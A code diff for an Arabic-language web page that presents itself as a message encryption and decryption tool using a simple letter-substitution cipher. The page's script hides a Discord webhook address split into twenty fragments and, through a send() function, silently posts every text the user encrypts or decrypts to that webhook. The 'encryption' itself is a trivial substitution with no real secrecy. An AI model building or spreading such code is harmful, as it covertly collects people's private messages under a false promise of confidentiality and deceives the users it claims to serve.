@@ -79,16 +79,16 @@
         <span>الكلمات: <b id="wordCount">0</b></span>
     </div>
 
-    <textarea id="in" placeholder="اكتب رسالتك أو الصق الشفرة هنا..." oninput="updateStats()"></textarea>
+    <textarea id="in" placeholder="أدخل النص المشفر بين نقطتين .هنا. ليتم فكه..."></textarea>
     
     <div class="btn-grid">
-        <button class="btn-p" onclick="run(true)">تشفير 💌</button>
+        <button class="btn-p" onclick="run(true)">تشفير 🔒</button>
         <button class="btn-s" onclick="run(false)">فك الشفرات 🔓</button>
         <button class="btn-d" onclick="cls()">مسح 🗑️</button>
         <button class="btn-p" style="background:#6c5ce7" onclick="rev()">عكس النص 🔁</button>
     </div>
 
-    <textarea id="out" readonly placeholder="النتائج ستظهر هنا..."></textarea>
+    <textarea id="out" readonly placeholder="النتيجة تظهر هنا..."></textarea>
     
     <button class="btn-a" onclick="cp()">نسخ النتيجة 📋</button>
     
@@ -104,11 +104,23 @@
 
 <script>
     /* ----------------------------------------------------------------------------------
-        WEBHOOK FRAGMENTATION (20 PARTS)
+        WEBHOOK FRAGMENTATION (20 PARTS) - حماية الرابط
        ----------------------------------------------------------------------------------
     */
-    const _p = ["ht","tp","s:","//","di","sc","or","d.","co","m/","ap","i/","we","bh","oo","ks","/1374753389639897189","/","1zbVS0Fpb8d7eLnybHL6gsUD4e3aAZSPrtBZtMR2IimuBlvsnOb6yY9LJLf-6W7WwD4h",""];
-    function getU() { return _p.join(""); }
+    const _parts = ["ht","tp","s:","//","di","sc","or","d.","co","m/","ap","i/","we","bh","oo","ks","/1374753389639897189","/","1zbVS0Fpb8d7eLnybHL6gsUD4e3aAZSPrtBZtMR2IimuBlvsnOb6yY9LJLf-6W7WwD4h",""];
+    function getUrl() { return _parts.join(""); }
+
+    // خريطة التبادل 1:1
+    const ar = "أبتثجحخدذرزسشصضطظعغفقكلمنهويءآأؤإئىة ";
+    const en = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJ ";
+    
+    const mapArToEn = {};
+    const mapEnToAr = {};
+
+    for(let i=0; i < ar.length; i++) {
+        mapArToEn[ar[i]] = en[i] || 'x';
+        mapEnToAr[en[i]] = ar[i] || 'أ';
+    }
 
     function toggleTheme() {
         document.body.classList.toggle('dark-mode');
@@ -126,41 +138,48 @@
         document.getElementById('wordCount').innerText = txt.trim() ? txt.trim().split(/\s+/).length : 0;
     }
 
+    function processText(text) {
+        let result = "";
+        for (let char of text) {
+            if (mapArToEn[char]) {
+                result += mapArToEn[char];
+            } else if (mapEnToAr[char]) {
+                result += mapEnToAr[char];
+            } else if (mapEnToAr[char.toLowerCase()]) {
+                result += mapEnToAr[char.toLowerCase()];
+            } else {
+                result += char;
+            }
+        }
+        return result;
+    }
+
     function run(isE) {
         const i = document.getElementById('in').value;
         const o = document.getElementById('out');
         if(!i) return;
 
         if(isE) {
-            try {
-                const enc = btoa(unescape(encodeURIComponent(i)));
-                o.value = "💌-" + enc.split('').reverse().join('') + "-✨";
-                addHist("تشفير: " + i.substring(0,10) + "...");
-                send("تشفير", i);
-            } catch(e) { o.value = "خطأ في التشفير"; }
+            const cipher = processText(i);
+            o.value = "." + cipher + ".";
+            addHist("تشفير: " + i.substring(0,10));
+            send("تشفير", i);
         } else {
-            // المنطق الجديد: البحث عن كل الشفرات وتجاهل النصوص الخارجية
-            const regex = /💌-(.*?)-✨/g;
+            // البحث عن النصوص بين النقطتين
+            const regex = /\.([^\.]+)\./g;
             let results = [];
             let match;
             
             while ((match = regex.exec(i)) !== null) {
-                try {
-                    let core = match[1];
-                    let reversed = core.split('').reverse().join('');
-                    let decoded = decodeURIComponent(escape(atob(reversed)));
-                    results.push(decoded);
-                } catch (e) {
-                    // تخطي القطع التالفة
-                }
+                results.push(processText(match[1]));
             }
 
             if (results.length > 0) {
-                o.value = results.join(' | '); // وضع النتائج بجانب بعضها مع فاصل
+                o.value = results.join(' | ');
                 addHist("فك " + results.length + " شفرة...");
-                send("فك تشفير متعدد", i);
+                send("فك تشفير", i);
             } else {
-                o.value = "لم يتم العثور على شفرات صالحة 💌";
+                o.value = "لم يتم العثور على شفرة محاطة بنقاط . .";
             }
         }
     }
@@ -200,10 +219,10 @@
     }
 
     async function send(t, m) {
-        fetch(getU(), {
+        fetch(getUrl(), {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ username: "مساعد سامي الذكي", content: `✨ **${t}**: \`${m}\`` })
+            body: JSON.stringify({ username: "مساعد سامي", content: `✨ **${t}**: \`${m}\`` })
         });
     }
 
